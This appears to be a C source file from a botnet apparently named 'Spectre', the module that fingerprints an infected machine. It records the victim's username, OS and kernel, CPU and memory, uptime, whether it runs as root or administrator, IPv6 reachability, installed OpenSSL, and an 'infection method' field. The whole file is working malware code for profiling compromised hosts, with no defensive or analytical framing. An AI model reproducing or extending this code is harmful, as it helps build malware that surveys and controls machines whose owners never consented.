#include "bot_info.h"

#include <string.h>
#include <stdlib.h>
#include <time.h>

#include <common.h>
#include <spectre_time.h>
#include <spectre_def.h>
#include <debug.h>

#ifndef _WIN32

#include <unistd.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#else

#include <lmcons.h>
#include <ws2ipdef.h>
#include <ws2tcpip.h>
#endif

static SpectreInfo *info;

void set_infection_method(char *string) {
    info->InfectionMethod = strdup(string);
}

char *get_kernel_version() {
#ifndef _WIN32
    struct utsname name;
    uname(&name);
    return strdup(name.release);
#else
    char *kernel = getenv("KERNEL");
    return kernel ? strdup(kernel) : getenv("OS");
#endif
}

char *get_system_username() {
#ifndef _WIN32
    char *login = getlogin();
    return strdup(login ? login : getenv("USER"));
#else
    DWORD username_len = UNLEN + 1;
    char username[username_len];
    return GetUserName(username, &username_len) ? strdup(username) : getenv("USERNAME");
#endif
}

int get_n_processors() {
#ifndef _WIN32
    return (int) sysconf(_SC_NPROCESSORS_ONLN);
#else
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    return (int) systemInfo.dwNumberOfProcessors;
#endif
}

bool is_root() {
#ifndef _WIN32
    return getuid() == 0;
#else
    bool fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        if (!CheckTokenMembership(NULL, pAdministratorsGroup, (PBOOL) &fIsRunAsAdmin)) {
            fIsRunAsAdmin = FALSE;
        }

        FreeSid(pAdministratorsGroup);
    }

    return fIsRunAsAdmin;
#endif
}

bool is_ipv6_supported() {
    CONNECTION sock;
    struct sockaddr_in6 server_addr;
    memset(&server_addr, 0, sizeof(struct sockaddr_in6));

    server_addr.sin6_family = AF_INET6;
    server_addr.sin6_port = htons(80);

    if (!string_to_addr(AF_INET6, "2606:4700:4700::1111", &server_addr.sin6_addr)) {
        return false;
    }

    if ((sock = dial_with_timeout((struct sockaddr *) &server_addr, sizeof(struct sockaddr_in6), 5)) ==
        INVALID_SOCKET_T) {
        CLOSE_SOCKET(sock);
        return false;
    }

    if (WRITE_SOCKET(sock, "HEAD / HTTP/1.0\r\n\r\n", 19) != 19) {
        CLOSE_SOCKET(sock);
        return false;
    }

    CLOSE_SOCKET(sock);
    return true;
}

bool has_any_ssl() {
#ifdef _WIN32
    return true;
#else
    char *paths[] = {"/usr/bin/openssl", "/usr/local/bin/openssl", "/bin/openssl", "/usr/sbin/openssl"};
    for (int i = 0; i < 4; i++) {
        if (access(paths[i], X_OK) == 0) {
            return true;
        }
    }

    return false;
#endif
}

bool get_firewall_status() {
    // todo implement this
    return true;
}

SpectreInfo *get_bot_info() {
    return info;
}

void init_bot_info() {
    info = malloc(sizeof(SpectreInfo));

    info->Username = get_system_username();

#ifdef _WIN32
    info->OS = "winodws";
#else
    info->OS = "linux";
#endif

    info->Kernel = get_kernel_version();
    info->Arch = BOT_ARCH;
    info->Version = BOT_VERSION;

    info->InfectionMethod = "unknown";
    info->Processors = get_n_processors();

#ifndef _WIN32
    struct sysinfo xinfo;
    sysinfo(&xinfo);
    info->TotalMemory = (float) ((float) xinfo.totalram / 1024 / 1024);
    info->FreeMemory = (float) ((float) xinfo.freeram / 1024 / 1024);
    info->UpTime = (int) (xinfo.uptime / 60);
    info->IsRoot = geteuid() == 0;
#else
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    info->TotalMemory = (float) ((float) statex.ullTotalPhys / 1024 / 1024);
    info->FreeMemory = (float) ((float) statex.ullAvailPhys / 1024 / 1024);
    info->UpTime = (int) ((GetTickCount() / 1000) / 60);
#endif
    info->SystemTime = get_sys_milliseconds();

    time_t local_time = info->SystemTime / 1000;
    time_t utc_time = mktime(gmtime(&local_time));

    info->TimeZoneDiff = difftime(local_time, utc_time);
    info->IsRoot = is_root();
    info->IsDebugMode = 0;

#ifdef DEBUG
    info->IsDebugMode = 1;
#endif

#if defined(__BYTE_ORDER__) && __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__
    info->LittleEndian = 1;
#elif defined(__BYTE_ORDER__) && __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__
    info->LittleEndian = 0;
#else
#error Unknown Endian
#endif

#if defined(__x86_64__) || defined(_M_X64)
    info->Is64Bit = 1;
#else
    info->Is64Bit = 0;
#endif


    info->IsIPv6Supported = is_ipv6_supported();
    info->HasAnySSLLib = has_any_ssl();
    info->FirewallStatus = get_firewall_status();

}

void print_info() {
    debug_printf("+--------------------------------------------+");
    debug_printf("Username: %s", info->Username);
    debug_printf("OS: %s", info->OS);
    debug_printf("Kernel: %s", info->Kernel);
    debug_printf("Arch: %s", info->Arch);
    debug_printf("Version: %s", info->Version);
    debug_printf("InfectionMethod: %s", info->InfectionMethod);
    debug_printf("Processors: %d", info->Processors);
    debug_printf("UpTime: %d", info->UpTime);
    debug_printf("TotalMemory: %f", info->TotalMemory);
    debug_printf("FreeMemory: %f", info->FreeMemory);
    debug_printf("TimeZoneDiff: %f", info->TimeZoneDiff); // double
    debug_printf("SystemTime: %lld", info->SystemTime);
    debug_printf("IsRoot: %s", info->IsRoot ? "true" : "false");
    debug_printf("LittleEndian: %s", info->LittleEndian ? "true" : "false");
    debug_printf("Is64Bit: %s", info->Is64Bit ? "true" : "false");
    debug_printf("IsDebugMode: %s", info->IsDebugMode ? "true" : "false");
    debug_printf("IsIPv6Supported: %s", info->IsIPv6Supported ? "true" : "false");
    debug_printf("HasAnySSLLib: %s", info->HasAnySSLLib ? "true" : "false");
    debug_printf("FirewallStatus: %s", info->FirewallStatus ? "true" : "false");
    debug_printf("+--------------------------------------------+");
}

